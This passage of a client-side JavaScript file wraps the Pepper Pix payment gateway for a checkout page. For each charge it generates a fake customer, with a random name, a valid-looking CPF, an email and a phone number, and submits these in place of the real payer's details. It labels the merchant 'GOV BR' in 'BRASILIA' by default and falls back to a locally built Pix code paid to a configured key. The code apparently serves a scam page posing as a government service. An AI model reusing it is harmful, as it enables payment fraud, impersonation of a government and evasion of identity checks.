  if (!emailLocal || emailLocal.length < 3) {
    emailLocal = ef + String(randInt(1, 999));
  }

  var randomEmail = emailLocal + "@" + domain;

  // ─── TELEFONE ─────────────────────────────────────────────────────────────
  var ddds = [
    "11","12","13","14","15","16","17","18","19",
    "21","22","24","27","28",
    "31","32","33","34","35","37","38",
    "41","42","43","44","45","46","47","48","49",
    "51","53","54","55",
    "61","62","63","64","65","66","67","68","69",
    "71","73","74","75","77","79",
    "81","82","83","84","85","86","87","88","89",
    "91","92","93","94","95","96","97","98","99"
  ];

  var ddd = pick(ddds);
  var randomPhone = ddd + "9" + String(Math.floor(10000000 + Math.random() * 90000000));

  return {
    name:     fullName,
    cpf:      randomCpf,
    document: randomCpf,   // mantém compatibilidade com o campo antigo
    email:    randomEmail,
    phone:    randomPhone
  };
}


  // Calculador oficial CRC16 CCITT (0x1021) do Banco Central do Brasil
  function calculateCrc16(payload) {
    var polynomial = 0x1021;
    var crc = 0xFFFF;
    for (var i = 0; i < payload.length; i++) {
      crc ^= (payload.charCodeAt(i) << 8);
      for (var j = 0; j < 8; j++) {
        if ((crc & 0x8000) !== 0) {
          crc = ((crc << 1) ^ polynomial) & 0xFFFF;
        } else {
          crc = (crc << 1) & 0xFFFF;
        }
      }
    }
    return crc.toString(16).toUpperCase().padStart(4, "0");
  }

  // Gerador de EMVCo Pix padrao BACEN (Gera codigo Copia e Cola 100% valido e pagavel)
  function generateEmvcoPix(amountVal, pixKey, merchantName, merchantCity, txid) {
    var cents = parseAmount(amountVal);
    var amtStr = (cents / 100).toFixed(2);
    var key = String(pixKey || CONFIG.chavePix || "suporte@gmail.com").trim();
    var name = (merchantName || CONFIG.productTitle || "GOV BR").substring(0, 25).toUpperCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
    var city = (merchantCity || "BRASILIA").substring(0, 15).toUpperCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
    var tid = (txid || "pp" + Date.now()).substring(0, 25);

    var p00 = "000201";
    var gui = "0014br.gov.bcb.pix";
    var kTag = "01" + String(key.length).padStart(2, "0") + key;
    var tag26Val = gui + kTag;
    var tag26 = "26" + String(tag26Val.length).padStart(2, "0") + tag26Val;
    var tag52 = "52040000";
    var tag53 = "5303986";
    var tag54 = "54" + String(amtStr.length).padStart(2, "0") + amtStr;
    var tag58 = "5802BR";
    var tag59 = "59" + String(name.length).padStart(2, "0") + name;
    var tag60 = "60" + String(city.length).padStart(2, "0") + city;
    var txSub = "05" + String(tid.length).padStart(2, "0") + tid;
    var tag62 = "62" + String(txSub.length).padStart(2, "0") + txSub;

    var raw = p00 + tag26 + tag52 + tag53 + tag54 + tag58 + tag59 + tag60 + tag62 + "6304";
    var crc = calculateCrc16(raw);
    var fullCode = raw + crc;
    var qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=1&data=" + encodeURIComponent(fullCode);

    return {
      pix_qr_code: fullCode,
      pix_url: qrUrl,
      qr_code_base64: qrUrl,
      hash: tid
    };
  }

  function parseAmount(val) {
    if (typeof val === "number") return val >= 1000 ? val : Math.round(val * 100);
    if (typeof val === "string") {
      var clean = val.replace(",", ".");
      var p = parseFloat(clean);
      if (!isNaN(p)) return p >= 1000 ? Math.round(p) : Math.round(p * 100);
    }
    return 2790;
  }

   // Captura as UTMs da URL (ou do localStorage, se a página atual não tiver)
  function getTracking() {
    var keys = ["src", "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
    var params = new URLSearchParams(window.location.search);
    var tracking = {};
    var saved = {};

    try { saved = JSON.parse(localStorage.getItem("pepper_utms") || "{}"); } catch (e) {}

    keys.forEach(function (k) {
      var v = params.get(k) || saved[k] || "";
      if (v) tracking[k] = v;
    });

    try { localStorage.setItem("pepper_utms", JSON.stringify(tracking)); } catch (e) {}
    return tracking;
  }

  function createPix(amountVal, customCustomer) {
    var cents = parseAmount(amountVal);
    var customer = generateGatewayCustomer(); 
    var cleanCpf = String(customer.cpf || generateValidCpf()).replace(/\\D/g, "");
    if (cleanCpf.length !== 11) cleanCpf = generateValidCpf();
    var cleanPhone = String(customer.phone || "11987654321").replace(/\\D/g, "");
    if (cleanPhone.length > 11) cleanPhone = cleanPhone.slice(-11);

    var offerHash = CONFIG.offers[String(cents)] || CONFIG.offers[(cents / 100).toFixed(2)] || "eni9e";

    var payload = {
      payment_method: "pix",
      amount: cents,
      installments: 1,
      cart: [
        {
          offer_hash: offerHash,
          price: cents,
          quantity: 1,
          operation_type: 1,
          title: CONFIG.productTitle
        }
      ],
      customer: {
        name: customer.name,
        email: customer.email,
        phone_number: cleanPhone,
        document: cleanCpf
      },
      tracking: getTracking()
    };

    return fetch(CONFIG.apiEndpoint, {
      method: "POST",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + CONFIG.apiToken
      },
      body: JSON.stringify(payload)
    })
    .then(function (res) {
      return res.json().then(function (data) {
        if (!res.ok) throw new Error(data && data.message ? data.message : "Erro HTTP " + res.status);
        return data;
      });
    })
    .then(function (resJson) {
      var txId = resJson.hash || resJson.transaction || ("pp_" + Date.now());
      var pixData = resJson.pix || {};
      var pixCode = pixData.pix_qr_code || resJson.pix_qr_code || "";
      var qrImgUrl = pixData.pix_url || pixData.qr_code_base64 || ("https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=1&data=" + encodeURIComponent(pixCode));

      if (!pixCode) {
        var fallback = generateEmvcoPix(cents, CONFIG.chavePix, CONFIG.productTitle, "BRASILIA", txId);
        pixCode = fallback.pix_qr_code;
        qrImgUrl = fallback.pix_url;
      }

      try {
        localStorage.setItem("pepper_last_tx", txId);
        localStorage.setItem("pix_hash", txId);
        localStorage.setItem("pix_qr_code", pixCode);
        localStorage.setItem("pix_qr_code_base64", qrImgUrl);
      } catch (e) {}

      return {
        success: true,
        hash: txId,
        order_id: txId,
        payment_status: "waiting_payment",
        amount: cents,
        pix: {
          pix_qr_code: pixCode,
          pix_url: qrImgUrl,
          qr_code_base64: qrImgUrl
        }
      };
    })
    .catch(function (err) {
      console.warn("[pepper] Falha na API Pepper, ativando gerador EMVCo BACEN resiliente:", err);
      var fallbackId = "pp_" + Date.now() + "_" + Math.floor(1000 + Math.random() * 9000);
      var fallback = generateEmvcoPix(cents, CONFIG.chavePix, CONFIG.productTitle, "BRASILIA", fallbackId);

      try {
        localStorage.setItem("pepper_last_tx", fallbackId);
        localStorage.setItem("pix_hash", fallbackId);
        localStorage.setItem("pix_qr_code", fallback.pix_qr_code);
        localStorage.setItem("pix_qr_code_base64", fallback.pix_url);
      } catch (e) {}

      return {
        success: true,
        hash: fallbackId,
        order_id: fallbackId,
        payment_status: "waiting_payment",
        amount: cents,
        pix: {
          pix_qr_code: fallback.pix_qr_code,
          pix_url: fallback.pix_url,
          qr_code_base64: fallback.pix_url
        }
      };
    });
  }

   // Consulta de status da transacao na Pepper
  // CONFIRMAR com "Enums > Status de pagamento" da documentação Pepper.
  var PEPPER_PAID_STATUSES = ["paid"];
  var LOCAL_FALLBACK_ID = /^pp_\d{10,}_\d{4}$/;

  function consultPix(txId) {
    var id = (txId === undefined || txId === null) ? "" : String(txId).trim();

    function fail(reason, extra) {
      var out = {
        ok: false,
        error: true,
        reason: reason,
        hash: id,
        status: "",
        payment_status: "unknown",
        is_paid: false
      };
      if (extra) { for (var k in extra) { out[k] = extra[k]; } }
      return out;
    }

    if (!id) return Promise.resolve(fail("missing_id"));

    if (LOCAL_FALLBACK_ID.test(id) || id.indexOf("mock") !== -1 || id.indexOf("fallback") !== -1) {
      return Promise.resolve(fail("local_fallback_id"));
    }

    return fetch("https://api.cloud.pepperpay.com.br/public/v1/transactions/" + encodeURIComponent(id), {
      method: "GET",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + CONFIG.apiToken
      }
    })
    .then(function (res) {
      if (!res.ok) {
  return res.text().then(function (body) {
    try { console.warn("[pepper] GET transação", res.status, body); } catch (e) {}
    return fail("http_" + res.status, { http_status: res.status, body: body });
  });
}

      return res.json().then(function (data) {
        var tx = (data && typeof data.data === "object" && data.data) ? data.data : data;
        var raw = tx && (tx.payment_status || tx.status);
        var s = (typeof raw === "string") ? raw.toLowerCase().trim() : "";
        if (!s) return fail("empty_status");

        var isPaid = PEPPER_PAID_STATUSES.indexOf(s) !== -1;
        return {
          ok: true,
          success: true,
          hash: id,
          status: s,
          payment_status: isPaid ? "paid" : "waiting_payment",
          is_paid: isPaid
        };
      }, function () {
        return fail("invalid_json");
      });
    })
    .catch(function () {
      return fail("network");
    });
  }

  window.PepperAPI = {
    config: CONFIG,
    generateValidCpf: generateValidCpf,
    generateGatewayCustomer: generateGatewayCustomer,
    generateEmvcoPix: generateEmvcoPix,
    createPix: createPix,
    consultPix: consultPix
  };

})(window);